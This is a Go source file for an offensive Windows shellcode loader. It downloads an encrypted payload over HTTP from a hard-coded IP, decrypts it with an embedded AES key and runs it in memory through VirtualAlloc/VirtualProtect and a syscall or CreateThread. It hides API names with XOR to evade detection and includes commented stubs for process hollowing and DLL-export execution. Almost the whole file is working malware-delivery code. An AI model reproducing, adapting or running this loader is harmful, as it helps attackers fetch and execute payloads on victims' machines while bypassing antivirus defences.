/*
Author: hxhBrofessor
Purpose:

	1- getFile() Retrieves the encrypted binary over the HTTP or HTTPS
	2- decryptFile() Decrypts the binary and stores it in a global variable
	3- method1_SysCall_XOR(shellcode) XORs the strings in attempts to be more stealthy for a simple syscall
	4- method2_CreateThreadXOR(shellcode) Creates Threads and XORs the strings


Disclaimer: This will not get passed dynamic code analysis

*/

package main

//go build -ldflags="-s -w -extldflags -static" .\shellcode-execute.g

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

const myKey = byte(0x01)

// encrypted
var (
	kdog  = xorEncrypt([]byte("kernel32.dll"), myKey)  //kernel32=kdog
	RTLMM = xorEncrypt([]byte("RtlMoveMemory"), myKey) //RtlMoveMemory=RTLMM
	CT    = xorEncrypt([]byte("CreateThread"), myKey)  //CreateThread=CT
	EP    = xorEncrypt([]byte("ExitProcess"), myKey)   //ExitProcess=EP
)

var shellcode []byte

func main() {
	getFile()
	decryptFile()
	method1_SysCall_XOR(shellcode)
	//method2_CreateThreadXOR(shellcode)
}

func getFile() {
	// Make GET request to URL
	resp, err := http.Get("http://192.168.153.145:9090/2ENC.bin")
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	// Create file on local file system
	//C:\\Users\\Public\\Downloads\\ENC.bin"
	file, err := os.Create("2ENC.bin")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Copy binary data from URL to file
	_, err = io.Copy(file, resp.Body)
	if err != nil {
		panic(err)
	}
}
func decryptFile() {
	// Reading ciphertext file
	//C:\\Users\\Public\\Downloads\\ENC.bin" /path will be used for later
	file, err := os.Open("2ENC.bin")
	if err != nil {
		log.Fatalf("Error opening file: %v", err)
	}
	defer file.Close()

	cipherText, err := ioutil.ReadAll(file)
	if err != nil {
		log.Fatalf("Error reading file: %v", err)
	}

	// Creating key
	key := []byte("xL3gGa4RM$S@LsSY")

	// Creating block of algorithm
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("Error creating cipher block: %v", err)
	}

	// Creating GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatalf("Error creating GCM: %v", err)
	}

	// Deattached nonce and decrypt
	nonce := cipherText[:gcm.NonceSize()]
	cipherText = cipherText[gcm.NonceSize():]
	plainText, err := gcm.Open(nil, nonce, cipherText, nil)
	if err != nil {
		log.Fatalf("Error decrypting file: %v", err)
	}

	// Assign the decryption content to the global variable
	shellcode = plainText

}
func xorEncrypt(data []byte, key byte) []byte {
	for i := 0; i < len(data); i++ {
		data[i] = data[i] ^ key
	}
	return data
}

func xorDecrypt(data []byte, key byte) []byte {
	for i := 0; i < len(data); i++ {
		data[i] = data[i] ^ key
	}
	return data
}

func findProcess(proc string) int {
	processList, err := ps.Processes()
	if err != nil {
		return -1
	}

	for x := range processList {
		var process ps.Process
		process = processList[x]
		if process.Executable() != proc {
			continue
		}
		p, errOpenProcess := windows.OpenProcess(
			windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
		if errOpenProcess != nil {
			continue
		}
		windows.CloseHandle(p)
		return process.Pid()
	}
	return 0
}

func method1_SysCall_XOR(sc []byte) {
	/*
		key := byte(0x01)
		//Encrypt with XOR
		kernel32 := xorEncrypt([]byte("kernel32.dll"), key)
		RtlMoveMemory := xorEncrypt([]byte("RtlMoveMemory"), key)
	*/

	//Decrypt
	kdog := windows.NewLazyDLL(string(xorDecrypt(kdog, myKey)))
	RTLMM := kdog.NewProc(string(xorDecrypt(RTLMM, myKey)))

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RTLMM.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}

	syscall.SyscallN(addr, 0, 0, 0, 0)
}

func method2_CreateThreadXOR(sc []byte) {
	/*
		key := byte(0x01)
		//Encrypt with XOR
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		kernel32 := xorEncrypt([]byte("kernel32.dll"), key)
		RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
		RtlMoveMemory := xorEncrypt([]byte("RtlMoveMemory"), myKey)
		CreateThread := kernel32.NewProc("CreateThread")
		CreateThread := xorEncrypt([]byte("CreateThread"), key)
	*/

	//Decrypted
	kdog := windows.NewLazyDLL(string(xorDecrypt(kdog, myKey)))
	RTLMM := kdog.NewProc(string(xorDecrypt(RTLMM, myKey)))
	CT := kdog.NewProc(string(xorDecrypt(CT, myKey)))
	ExitProcessProc := kdog.NewProc(string(xorDecrypt(EP, myKey)))

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RTLMM.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}
	thread, _, err := CT.Call(0, 0, addr, uintptr(0), 0, 0)
	if err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] CreateThread(): %s", err.Error()))
	}
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	ExitProcessProc.Call(0)
}

/*
func method3_ProcessHallow(sc []byte) {
	// Get handle to current process
	kernel32dll := windows.NewLazyDLL("kernel32.dll")
	OpenProcess := kernel32dll.NewProc("OpenProcess")
	GetCurrentProcessId := kernel32dll.NewProc("GetCurrentProcessId")
	processHandle, _, _ := OpenProcess.Call(syscall.PROCESS_QUERY_INFORMATION(GetCurrentProcessId))

	// Allocate memory for the hollowed code
	VirtualAllocEx := kernel32dll.NewProc("VirtualAllocEx")
	hollowedCodeAddr, _, _ := VirtualAllocEx.Call(processHandle, 0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)

	// Write the hollowed code to the allocated memory
	WriteProcessMemory := kernel32dll.NewProc("WriteProcessMemory")
	_, _, _ = syscall.SyscallN(WriteProcessMemory.Addr(), 5, processHandle, hollowedCodeAddr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0, 0)
	fmt.Println("Shellcode written to memory")
}
*/

//DLL start creation
/*

import "C"

//export DllRegisterServer
func DllRegisterServer() bool {
	return true
}

//export DllUnregisterServer
func DllUnregisterServer() bool {
	return true
}

//export DllInstall
func DllInstall() bool {
	main()
	return true
}
*/
